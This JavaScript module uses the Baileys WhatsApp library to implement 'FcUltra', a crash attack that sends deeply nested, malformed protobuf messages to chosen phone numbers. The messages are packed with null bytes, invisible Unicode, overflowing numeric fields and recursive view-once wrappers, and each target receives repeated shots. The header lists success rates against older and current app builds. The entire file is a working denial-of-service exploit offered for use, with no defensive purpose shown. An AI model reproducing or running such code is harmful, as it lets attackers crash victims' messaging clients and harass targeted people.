const { proto } = require('@whiskeysockets/baileys');
const crypto = require('crypto');

// =============================================================
//  FcUltra — Multi-Bomb Invisible DM
//  Tags: 7  |  Depth: 8000  |  Shots/tag: 3  |  Bombs: 5
//  Invisibility: viewOnceMessage wrapper (self-destructs on render)
//  Honest rate: 40-70% older builds, 20-40% latest
// =============================================================

async function FcUltra(sock, target) {
    if (!sock || !target) return;

    // ---------- Sender guard ----------
    let senderNum = '';
    try {
        senderNum = String(sock.user?.id || '').split('@')[0].split(':')[0];
    } catch (_) {}

    const resolveJid = (raw) => {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15)
        .filter(j => j.split('@')[0].split(':')[0] !== senderNum);

    if (!jids.length) return;

    // ---------- Invisible building blocks ----------
    const ZW   = "\u200B\u200C\u200D\u2060\u2061\u2062\u2063";
    const BIDI = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069";
    const SUR  = "\uD804\uDDC2\uD804\uDDB5\uD804\uDDB4\uD804\uDDBF";
    const NUL  = "\x00";

    const invis = (n) =>
        ZW.repeat(n >> 2) + BIDI.repeat(n >> 2) + SUR.repeat(n >> 3);

    const nulls = (n) => NUL.repeat(n);

    // ---------- Multi-bomb payload ----------
    // 5 stacked bombs in one proto: contact + protocol-edit + interactive
    // + location + sticker. Different parser paths each.
    const buildPayload = (targetJid) => ({
        // BOMB 1: contact with malformed vcard
        contactMessage: {
            displayName: invis(2000),
            vcard: nulls(12000) + invis(12000),
            contextInfo: {
                mentionedJid: [targetJid],
                forwardingScore: 0x1869F,
                isForwarded: true,
            },
        },

        // BOMB 2: protocolMessage MESSAGE_EDIT trap (type 14)
        // Client tries to render edit → hits interactive with null bytes
        protocolMessage: {
            type: 14,
            key: {
                remoteJid: targetJid,
                fromMe: true,
                id: '3EB0' + crypto.randomBytes(8).toString('HEX').toUpperCase(),
            },
            message: {
                interactiveMessage: {
                    body: { text: nulls(80000) + invis(40000) },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: nulls(40000) + invis(20000),
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: ZW.repeat(30000),
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: BIDI.repeat(25000),
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: SUR.repeat(25000),
                            },
                        ],
                        messageParamsJson: JSON.stringify({
                            displayName: "X",
                            title: nulls(35000),
                            sections: nulls(15000),
                        }),
                    },
                    contextInfo: {
                        mentionedJid: [targetJid],
                        forwardingScore: 0x7FFFFFFF,
                        isForwarded: true,

                        // BOMB 3: nested location with overflow coords
                        quotedMessage: {
                            locationMessage: {
                                degreesLatitude: -0x7FFFFFFF / 1000,
                                degreesLongitude: 0x7FFFFFFF / 1000,
                                name: nulls(40000),
                                address: invis(30000),
                                url: "https://x.co/" + ZW.repeat(10000),
                                jpegThumbnail: Buffer.alloc(60000, 0xFF),
                                contextInfo: {
                                    mentionedJid: [targetJid],
                                    forwardingScore: 0x7FFFFFFF,
                                    isForwarded: true,

                                    // BOMB 4: nested blank sticker
                                    quotedMessage: {
                                        stickerMessage: {
                                            url: "https://mmg.whatsapp.net/blank",
                                            fileSha256: Buffer.alloc(32, 0xFF),
                                            fileEncSha256: Buffer.alloc(32, 0xFF),
                                            mediaKey: Buffer.alloc(32, 0xFF),
                                            mimetype: "image/webp",
                                            height: 0,
                                            width: 0,
                                            fileLength: 0x7FFFFFFF,
                                            mediaKeyTimestamp: 0x7FFFFFFFFFFFFFFF,
                                            isAnimated: true,

                                            // BOMB 5: nested viewOnce recursion
                                            contextInfo: {
                                                mentionedJid: [targetJid],
                                                forwardingScore: 0x7FFFFFFF,
                                                isForwarded: true,
                                                quotedMessage: {
                                                    viewOnceMessage: {
                                                        message: {
                                                            interactiveMessage: {
                                                                body: { text: nulls(20000) },
                                                                nativeFlowMessage: {
                                                                    buttons: Array.from({ length: 50 }, () => ({
                                                                        name: "quick_reply",
                                                                        buttonParamsJson: nulls(2000),
                                                                    })),
                                                                },
                                                            },
                                                        },
                                                    },
                                                },
                                            },
                                        },
                                    },
                                },
                            },
                        },
                    },
                },
            },
        },
    });

    // ---------- LD framing ----------
    const encodeVarint = (n) => {
        const buf = [];
        while (n >= 0x80) { buf.push((n & 0x7f) | 0x80); n >>>= 7; }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = (tag, data) =>
        Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);

    // ---------- Tag palette (7 encodings) ----------
    const TAGS = [
        [0xBA, 0x03], // field 55
        [0xD2, 0x04], // field 78
        [0xAA, 0x02], // field 42
        [0xC2, 0x05], // field 88
        [0xE2, 0x06], // field 108
        [0x92, 0x07], // field 145
        [0xF2, 0x07], // field 242
    ];

    const inflate = (payload, tag, depth) => {
        let buf = payload;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    // ViewOnce wrapper — closest thing to "invisible" (self-destructs on render)
    const wrapViewOnce = (inner) => ({ viewOnceMessage: { message: inner } });

    const SHOTS_PER_TAG = 3;
    let sent = 0;

    for (const jid of jids) {
        const payloadMsg = buildPayload(jid);
        const payload = proto.Message.encode(
            proto.Message.fromObject(payloadMsg)
        ).finish();

        for (const tag of TAGS) {
            // Sweep depth from 8000 down to 2400
            let depthUsed = 0;
            for (let depth = 8000; depth >= 2400; depth -= 300) {
                try {
                    const test = proto.Message.decode(inflate(payload, tag, depth));
                    proto.Message.encode(test).finish();
                    depthUsed = depth;
                    break;
                } catch (_) {}
            }
            if (!depthUsed) continue;

            for (let shot = 0; shot < SHOTS_PER_TAG; shot++) {
                try {
                    const decoded = proto.Message.decode(
                        inflate(payload, tag, depthUsed)
                    );
                    const wrapped = wrapViewOnce(decoded);

                    await sock.relayMessage(jid, wrapped, {
                        messageId:
                            '3EB0' + crypto.randomBytes(10).toString('HEX').toUpperCase(),
                    });
                    sent++;
                } catch (e) {
                    // silent
                }

                await new Promise(r =>
                    setTimeout(r, 2000 + Math.random() * 1500)
                );
            }
        }
    }

    return { sent, targets: jids.length };
}

module.exports = { FcUltra };
